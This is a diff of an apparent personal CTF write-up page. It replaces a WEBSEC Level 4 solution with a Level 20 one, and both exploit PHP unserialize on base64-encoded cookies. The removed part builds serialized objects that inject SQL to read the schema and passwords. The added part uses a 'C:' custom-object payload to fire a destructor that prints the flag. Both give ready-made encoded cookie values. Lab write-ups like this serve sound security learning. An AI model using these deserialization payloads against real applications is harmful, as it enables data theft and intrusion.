@@ -76,38 +76,62 @@
         
   <section class="container centered">
   <div class="error">
-   <h1 id="websec-level-4">WEBSEC Level 4</h1><br><br>
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   <h1 id="websec-level-20">WEBSEC Level 20</h1>
 <h3 id="challenge-description">Challenge description</h3>
-<p>Serialization is a pain!</p><br>
+<p>Call me maybe</p>
 <h3 id="initial-analysis">Initial analysis</h3>
-<p><code>$sql->query = 'SELECT username FROM users WHERE id=';  //query
+<p><code> 
+include "flag.php";
 
+class Flag {
+    public function __destruct() {
+       global $flag;
+       echo $flag; 
+    }
+}
 
-if (isset ($_COOKIE['leet_hax0r'])) {
-    $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));   //deserialization vuln
-else  $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
+if (isset ($_POST['value']) and ! empty ($_POST['value'])) {
+    /* Add a value twice to remove it from the list. */
+    if (($key = array_search ($_POST['value'], $data)) !== false) {
+        unset ($data[$key]);
+    } else { /* Else, simply add it. */
+        array_push ($data, $_POST['value']);
+    }
+    setcookie ('data', base64_encode (serialize ($data)));
+}
 
-class SQL {
-    public $query = '';
-    public $conn;
-    public function __construct() {      //class
-    }</code></p><br>
-<h3 id="tldr">tl;dr</h3>
-<p>STEP 1: <?php class SQL { public $query = `'SELECT sql as username FROM sqlite_master'`; }
-
-$a = new SQL(); echo serialize($a); echo base64_encode(serialize($a)); ?></p>
-<p>=&gt; O:3:&quot;SQL&quot;:1:{s:5:&quot;query&quot;;s:41:&quot;SELECT sql as username FROM sqlite_master&quot;;} =&gt; TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6NDE6IlNFTEVDVCBzcWwgYXMgdXNlcm5hbWUgRlJPTSBzcWxpdGVfbWFzdGVyIjt9</p>
-<p>STEP 2: Assign Cookie value= <code>TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6NDE6IlNFTEVDVCBzcWwgYXMgdXNlcm5hbWUgRlJPTSBzcWxpdGVfbWFzdGVyIjt9</code></p><p> OUTPUT: Username: CREATE TABLE users(id int, username varchar, password varchar)</p>
-<p>STEP 3: <?php class SQL { public $query = `'SELECT password as username FROM sqlite_master'`; }
-
-$a = new SQL(); echo serialize($a); echo base64_encode(serialize($a)); ?></p>
-<p>=&gt; O:3:&quot;SQL&quot;:1:{s:5:&quot;query&quot;;s:38:&quot;SELECT password as username FROM users&quot;;} =&gt; TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6Mzg6IlNFTEVDVCBwYXNzd29yZCBhcyB1c2VybmFtZSBGUk9NIHVzZXJzIjt9</p>
-<p>STEP 2: Assign Cookie value= <code>TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6Mzg6IlNFTEVDVCBwYXNzd29yZCBhcyB1c2VybmFtZSBGUk9NIHVzZXJzIjt9</code></p>
-<p></p><p>OUTPUT: Username: WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}</p><br>
+</code></p>
+<h3 id="walk-through">Walk through</h3>
+<p>STEP 1: Serialize the Flag class object with custom with Custom Object OUTPUT: C:4:&quot;Flag&quot;:0:{}</p>
+<p>STEP 2: Base64 Encode of Output OUTPUT: Qzo0OiJGbGFnIjowOnt9</p>
+<p>STEP 3: Set the cookie value(data) as Qzo0OiJGbGFnIjowOnt9 OUTPUT: I threw a class in the well Don't ask me I'll never tell I looked at you as it fell And now you're in my way I trade my soul for a shell Pennies and dimes for a leak I wasn't looking for this But now you're in my way Your stare was holding Ripped code stacktrace was showing Hot night Wind was blowing Where you think you're going baby? Hey I just met you And this is crazy But here's my method So call it maybe It's hard to look right at you baby But here's my method So call it maybe Hey I just met you And this is crazy But here's my method So call it maybe And all the other hackers Try to chase me But here's it method So call me maybe WEBSEC{CVE-2012-5692_was_a_lof_of_phun_thanks_to_i0n1c_but_this_was_not_the_only_bypass}</p>
 <h3 id="flag">Flag</h3>
-<p><strong>FLAG</strong>: <code>WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}</code></p>
+<p><strong>FLAG</strong>: <code>WEBSEC{CVE-2012-5692_was_a_lof_of_phun_thanks_to_i0n1c_but_this_was_not_the_only_bypass}</code></p>
 <p>For further queries, please DM me on Twitter: <a href="https://twitter.com/m0n574">https://twitter.com/m0n574</a>.</p>
-
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
 
   </div>
 </section>
